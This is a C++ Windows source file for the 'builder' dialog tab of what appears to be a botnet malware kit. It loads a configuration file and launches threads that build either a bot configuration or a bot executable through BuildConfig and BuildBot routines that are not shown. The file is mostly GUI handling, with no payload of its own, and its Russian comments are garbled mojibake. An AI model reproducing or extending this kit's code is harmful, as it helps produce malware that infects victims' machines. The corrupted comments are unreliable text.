#include <windows.h>
#include <shlwapi.h>
#include <shellapi.h>

#include "defines.h"
#include "resources\resources.h"
#include "buildbot.h"
#include "buildconfig.h"
#include "main.h"
#include "languages.h"
#include "tools.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\fs.h"
#include "..\common\gui.h"

#if(BO_CLIENT_PLATFORMS > 0)

#define WM_ENABLE_BUTTONS (WM_USER + 100)

/*
  Р вЂ”Р В°Р С–РЎР‚РЎС“Р В·Р С”Р В° Р С”Р С•Р Р…РЎвЂћР С‘Р С–РЎС“РЎР‚Р В°РЎвЂ Р С‘Р С‘.

  IN hwnd      - РЎвЂ¦РЎРЊР Р…Р Т‘Р В» Р Р†Р С”Р В»Р В°Р Т‘Р С”Р С‘.
  IN OUT file  - РЎвЂћР В°Р в„–Р В» Р С”Р С•Р Р…РЎвЂћР С‘Р С–РЎС“РЎР‚Р В°РЎвЂ Р С‘Р С‘.
  OUT config   - Р С”Р С•Р Р…РЎвЂћР С‘Р С–РЎС“РЎР‚Р В°РЎвЂ Р С‘РЎРЏ.
  IN showError - Р Р†РЎвЂ№Р Р†Р С•Р Т‘Р С‘РЎвЂљРЎРЉ Р В»Р С‘ РЎРѓР С•Р С•Р В±РЎвЂ°Р ВµР Р…Р С‘Р Вµ Р Р† РЎРѓР В»РЎС“РЎвЂЎР В°Р С‘ Р С•РЎв‚¬Р С‘Р В±Р С”Р С‘.

  Return       - true - Р Р† РЎРѓР В»РЎС“РЎвЂЎР В°Р С‘ РЎС“РЎРѓР С—Р ВµРЎвЂ¦Р В°,
                 false - Р Р† РЎРѓР В»РЎС“РЎвЂЎР В°Р С‘ Р С—РЎР‚Р С•Р Р†Р В°Р В»Р В°.
*/
static bool loadConfig(HWND hwnd, LPWSTR file, Config0::CFGDATA *config, bool showError)
{
  bool enable = false;
  if(Config0::_ParseFile(file, config))
  {
    if(config->dwVarsCount > 0)enable = true;
    else Config0::_Close(config);
  }
  
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_SOURCE_EDIT), enable);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_BUILD_CONFIG), enable);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_BUILD_BOT), enable);

  if(enable == false)
  {
    if(showError)CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_builder_source_fopen_failed), NULL, MB_ICONERROR | MB_OK);
    CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE, Languages::get(Languages::tool_builder_source_not_defined));
    file[0] = 0;
  }
  else
  {
    CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE, file);
  }
  
  return enable;
}

/*
  Р вЂ™Р С”Р В»РЎР‹РЎвЂЎР В°Р ВµРЎвЂљ, Р С•РЎвЂљР С”Р В»РЎР‹РЎвЂЎР В°Р ВµРЎвЂљ Р Р†РЎРѓР Вµ Р С”Р С•Р С—Р С”Р С‘ Р Р…Р В° Р Р†Р С”Р В»Р В°Р Т‘Р С”Р Вµ.

  IN hwnd   - Р Р†Р С”Р В»Р В°Р Т‘Р С”Р В°.
  IN enable - true - Р Р†Р С”Р В»РЎР‹РЎвЂЎР С‘РЎвЂљРЎРЉ,
              false - Р Р†РЎвЂ№Р С”Р В»РЎР‹РЎвЂЎР С‘РЎвЂљРЎРЉ.
*/
static void enableButtons(HWND hwnd, bool enable)
{
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_SOURCE_BROWSE), enable);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_SOURCE_EDIT), enable);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_BUILD_CONFIG), enable);
  CWA(user32, EnableWindow)(CWA(user32, GetDlgItem)(hwnd, IDC_BUILDER_BUILD_BOT), enable);
}

typedef struct
{
  BYTE type;               //Build type: 0 - configuration 1 - bot.
  HWND owner;              //Window tab.
  Config0::CFGDATA config; //Configuration.
}BUILDDATA;

/*
  Р СџР С•РЎвЂљР С•Р С” Р Т‘Р В»РЎРЏ Р С—РЎР‚Р С•РЎвЂ Р ВµРЎРѓРЎРѓР В° РЎРѓР В±Р С•РЎР‚Р С”Р С‘ РЎвЂћР В°Р в„–Р В»Р С•Р Р† Р В±Р С•РЎвЂљР В°.

  IN p - BUILDDATA.
  
  Return  - 0
*/
static DWORD WINAPI buildThread(void *p)
{
  BUILDDATA *bd = (BUILDDATA *)p;

  if(bd->type == 0)BuildConfig::_run(bd->owner, CWA(user32, GetDlgItem)(bd->owner, IDC_BUILDER_BUILD_OUTPUT), &bd->config, homePath);
  else BuildBot::_run(bd->owner, CWA(user32, GetDlgItem)(bd->owner, IDC_BUILDER_BUILD_OUTPUT), &bd->config, homePath);
  
  //Exit.
  Config0::_Close(&bd->config);
  CWA(user32, SendMessageW)(bd->owner, WM_ENABLE_BUTTONS, 0, 0);
  Mem::free(bd);
  return 0;
}

/*Р вЂ™Р’В Р вЂ™Р’В Processing tab.*/
INT_PTR CALLBACK toolBuilderProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
  static WCHAR configFile[MAX_PATH];
  static HANDLE subThread;

  switch(uMsg)
  {
    case WM_INITDIALOG:
    {
      subThread = NULL;

      //Expose the line.
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_TITLE, Languages::get(Languages::tool_builder_source_title));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_BROWSE, Languages::get(Languages::tool_builder_source_browse));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_SOURCE_EDIT, Languages::get(Languages::tool_builder_source_edit));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_TITLE, Languages::get(Languages::tool_builder_build_title));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_CONFIG, Languages::get(Languages::tool_builder_build_config));
      CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_BOT, Languages::get(Languages::tool_builder_build_bot));
      CWA(user32, SendDlgItemMessageW)(hwnd, IDC_BUILDER_SOURCE, EM_LIMITTEXT, MAX_PATH, 0);
      CWA(user32, SendDlgItemMessageW)(hwnd, IDC_BUILDER_BUILD_OUTPUT, EM_LIMITTEXT, 0, 0);
      
      //Choose the configuration by default.
      {
        Config0::CFGDATA config;
        if(Fs::_pathCombine(configFile, homePath, L"config.txt") && loadConfig(hwnd, configFile, &config, false))Config0::_Close(&config);
      }
      break;
    }
    
    case WM_CANCLOSE:
    {
      closeThreadIfFinsinhed(&subThread);
      CWA(user32, SetWindowLongW)(hwnd, DWL_MSGRESULT, subThread == NULL ? true : false);
      break;
    }
    
    case WM_ENABLE_BUTTONS:
    {
      if(configFile[0] != 0)enableButtons(hwnd, true);
      break;
    }

    case WM_COMMAND: 
    {
      switch(LOWORD(wParam))
      {
        case IDC_BUILDER_SOURCE_BROWSE:
        {
          if(Gui::_browseForFile(hwnd, homePath, configFile))
          {
            Config0::CFGDATA config;
            if(loadConfig(hwnd, configFile, &config, true))Config0::_Close(&config);
          }
          break;
        }

        case IDC_BUILDER_SOURCE_EDIT:
        {
          if(configFile[0] != 0)
          {
            if((int)CWA(shell32, ShellExecuteW)(hwnd, L"edit", configFile, NULL, homePath, SW_SHOWNORMAL) <= 32)
            {
              CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::tool_builder_source_edit_failed), NULL, MB_ICONERROR | MB_OK);
            }
          }
          break;
        }

        case IDC_BUILDER_BUILD_CONFIG:
        case IDC_BUILDER_BUILD_BOT:
        {
          closeThreadIfFinsinhed(&subThread);
          if(configFile[0] != 0 && subThread == NULL)
          {
            CWA(user32, SetDlgItemTextW)(hwnd, IDC_BUILDER_BUILD_OUTPUT, NULL);
            
            Config0::CFGDATA config;
            if(loadConfig(hwnd, configFile, &config, true))
            {
              BUILDDATA *bd = (BUILDDATA *)Mem::alloc(sizeof(BUILDDATA));
              if(bd != NULL)
              {
                bd->type  = LOWORD(wParam) == IDC_BUILDER_BUILD_CONFIG ? 0 : 1;
                bd->owner = hwnd;
                Mem::_copy(&bd->config, &config, sizeof(Config0::CFGDATA));

                enableButtons(hwnd, false);
                if((subThread = CWA(kernel32, CreateThread)(NULL, 0, buildThread, bd, 0, NULL)) != NULL)break;
                enableButtons(hwnd, true);
                Mem::free(bd);
              }
              Config0::_Close(&config);
              CWA(user32, MessageBoxW)(hwnd, Languages::get(Languages::error_not_enough_memory), NULL, MB_ICONERROR | MB_OK);
            }
          }
          break;
        }

        default:
          return FALSE;
      }
      break;
    }

    default:
      return FALSE;
  }

  return TRUE;
}
#endif
